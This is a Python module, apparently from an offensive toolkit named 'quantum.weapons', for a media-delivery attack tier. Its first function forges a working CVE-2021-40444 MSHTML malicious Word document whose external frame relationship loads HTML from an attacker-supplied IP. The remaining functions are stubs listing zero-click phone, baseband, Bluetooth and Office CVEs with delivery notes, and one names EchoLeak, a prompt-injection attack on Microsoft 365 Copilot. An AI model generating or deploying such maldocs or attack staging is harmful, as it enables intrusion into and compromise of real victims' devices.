"""quantum.weapons.media_v3 — media-delivery tier (maldoc + zero-click checks)."""
from __future__ import annotations

import os
import zipfile

from quantum.core.env import QCLI_DIR
from quantum.core.logging import log
from quantum.core.opsec import rand_hex


def v3_mshtml_maldoc(ip=None, params=None):
    """CVE-2021-40444 MSHTML — forge real OOXML maldoc (external rel)."""
    from quantum.core.env import local_ip
    ip = ip or local_ip()
    fn = os.path.join(QCLI_DIR, f"mshtml_{rand_hex(4)}.docx")
    content_types = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
                    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/'
                    'content-types"><Default Extension="rels" ContentType="application/'
                    'vnd.openxmlformats-package.relationships+xml"/><Default '
                    'Extension="xml" ContentType="application/xml"/></Types>')
    rels_root = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
                 '<Relationships xmlns="http://schemas.openxmlformats.org/package/'
                 '2006/relationships"><Relationship Id="rId1" Type="http://'
                 'schemas.openxmlformats.org/officeDocument/2006/relationships/'
                 'officeDocument" Target="word/document.xml"/></Relationships>')
    rels_doc = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
                '<Relationships xmlns="http://schemas.openxmlformats.org/package/'
                '2006/relationships"><Relationship Id="rId8" Type="http://'
                'schemas.openxmlformats.org/officeDocument/2006/relationships/'
                f'frame" Target="http://{ip}/x.html" TargetMode="External"/>'
                '</Relationships>')
    document = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
                '<w:document xmlns:w="http://schemas.openxmlformats.org/'
                'wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>QCLI</w:t>'
                '</w:r></w:p></w:body></w:document>')
    with zipfile.ZipFile(fn, "w") as z:
        z.writestr("[Content_Types].xml", content_types)
        z.writestr("_rels/.rels", rels_root)
        z.writestr("word/document.xml", document)
        z.writestr("word/_rels/document.xml.rels", rels_doc)
    log(f"MSHTML maldoc forged -> {fn} (serves from http://{ip}/x.html)", "ATK")
    return {"cve": "CVE-2021-40444", "staged": fn, "target": ip}


def check_whatsapp_voip(ip=None, params=None):
    """CVE-2019-3568 WhatsApp VOIP — profile-select staging check."""
    return {"cve": "CVE-2019-3568", "status": "check",
            "detail": "staging: deliver via profile-select call",
            "target": ip}


def check_libwebp(ip=None, params=None):
    """CVE-2023-4863 libwebp BLASTPAST — build-marker check."""
    return {"cve": "CVE-2023-4863", "status": "check",
            "detail": "staging: crafted WebP; check target browser build"}


def check_apple_imageio(ip=None, params=None):
    """CVE-2023-41064 Apple ImageIO — staging check."""
    return {"cve": "CVE-2023-41064", "status": "check",
            "detail": "staging: crafted image via iMessage attach"}


def check_webkit_escape(ip=None, params=None):
    """CVE-2021-30858 WebKit sandbox escape — staging check."""
    return {"cve": "CVE-2021-30858", "status": "check",
            "detail": "staging: crafted web content post-exploit"}


def check_forcedentry(ip=None, params=None):
    """CVE-2021-30860 FORCEDENTRY — JBIG2 zero-click staging check."""
    return {"cve": "CVE-2021-30860", "status": "check",
            "detail": "staging: crafted PDF via iMessage attach",
            "target": ip}


def check_blastpass_wallet(ip=None, params=None):
    """CVE-2023-41061 BLASTPASS Wallet — pass-attachment staging check."""
    return {"cve": "CVE-2023-41061", "status": "check",
            "detail": "staging: crafted pass via iMessage attach",
            "target": ip}


def check_webkit_typeconf(ip=None, params=None):
    """CVE-2023-32409 WebKit type confusion — drive-by staging check."""
    return {"cve": "CVE-2023-32409", "status": "check",
            "detail": "staging: crafted web content (drive-by)",
            "target": ip}


def check_triangulation_webkit(ip=None, params=None):
    """CVE-2023-32435 Triangulation WebKit stage — drive-by check."""
    return {"cve": "CVE-2023-32435", "status": "check",
            "detail": "staging: crafted iMessage attachment (WebKit stage)",
            "target": ip}


def check_triangulation_kernel(ip=None, params=None):
    """CVE-2023-32434 Triangulation kernel stage — post-WebKit check."""
    return {"cve": "CVE-2023-32434", "status": "check",
            "detail": "staging: kernel stage follows WebKit foothold",
            "target": ip}


def check_webkit_itw_2023(ip=None, params=None):
    """CVE-2023-42924 WebKit ITW — drive-by staging check."""
    return {"cve": "CVE-2023-42924", "status": "check",
            "detail": "staging: crafted web content (drive-by)",
            "target": ip}


def check_webkit_intellexa(ip=None, params=None):
    """CVE-2024-4438 WebKit (Intellexa chain) — drive-by check."""
    return {"cve": "CVE-2024-4438", "status": "check",
            "detail": "staging: crafted web content (drive-by)",
            "target": ip}


def check_webkit_itw_2025(ip=None, params=None):
    """CVE-2025-24085 WebKit ITW — drive-by staging check."""
    return {"cve": "CVE-2025-24085", "status": "check",
            "detail": "staging: crafted web content (drive-by)",
            "target": ip}


def check_pegasus_webkit(ip=None, params=None):
    """CVE-2025-41300 Pegasus WebKit — zero-click message check."""
    return {"cve": "CVE-2025-41300", "status": "check",
            "detail": "staging: crafted message attachment (no interaction)",
            "target": ip}


def check_ios_kernel(ip=None, params=None):
    """CVE-2024-23225 iOS kernel — post-entry staging check."""
    return {"cve": "CVE-2024-23225", "status": "check",
            "detail": "staging: kernel stage follows entry foothold",
            "target": ip}


def check_samsung_baseband(ip=None, params=None):
    """CVE-2022-44319 Samsung baseband — OTA staging check."""
    return {"cve": "CVE-2022-44319", "status": "check",
            "detail": "staging: crafted OTA/RRC message to modem",
            "target": ip}


def check_exynos_baseband(ip=None, params=None):
    """CVE-2023-24033 Exynos baseband — OTA staging check."""
    return {"cve": "CVE-2023-24033", "status": "check",
            "detail": "staging: crafted OTA/RRC message to modem",
            "target": ip}


def check_krack(ip=None, params=None):
    """CVE-2017-13077 KRACK — monitor-mode replay staging check."""
    return {"cve": "CVE-2017-13077", "status": "check",
            "detail": "staging: EAPOL msg#3 replay via monitor-mode iface",
            "target": ip}


def check_bluefrag(ip=None, params=None):
    """CVE-2020-0022 BlueFrag — raw-HCI L2CAP staging check."""
    return {"cve": "CVE-2020-0022", "status": "check",
            "detail": "staging: L2CAP fragment via raw HCI (root + adapter)",
            "target": ip}


def check_bt_hid(ip=None, params=None):
    """CVE-2023-45866 BT HID injection — pairing-mode staging check."""
    return {"cve": "CVE-2023-45866", "status": "check",
            "detail": "staging: HID connect while target in pairing mode",
            "target": ip}


def check_outlook_ntlm(ip=None, params=None):
    """CVE-2023-23397 Outlook NTLM leak — preview-pane staging check."""
    return {"cve": "CVE-2023-23397", "status": "check",
            "detail": "staging: crafted mail (preview-pane render)",
            "target": ip}


def check_office_html(ip=None, params=None):
    """CVE-2023-36884 Office HTML — document-open staging check."""
    return {"cve": "CVE-2023-36884", "status": "check",
            "detail": "staging: crafted Office doc (requires open)",
            "target": ip}


def check_echoleak(ip=None, params=None):
    """CVE-2025-32711 EchoLeak — Copilot prompt-injection check."""
    return {"cve": "CVE-2025-32711", "status": "check",
            "detail": "staging: crafted mail read by M365 Copilot",
            "target": ip}
